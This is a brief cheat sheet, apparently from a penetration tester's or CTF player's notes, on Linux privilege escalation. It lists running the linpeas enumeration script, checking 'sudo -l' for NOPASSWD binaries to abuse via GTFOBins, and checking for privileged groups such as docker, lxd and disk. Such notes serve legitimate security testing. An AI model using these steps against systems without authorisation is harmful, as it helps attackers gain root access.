Linux privilege escalation
++++++++++++++++++++++++++++++++++++++++
# Automated:
./linpeas.sh | tee linpeas.out
# Manual quick wins:
sudo -l                              # NOPASSWD / runnable binaries -> GTFOBins
id; groups                           # interesting groups (docker, lxd, disk, adm)
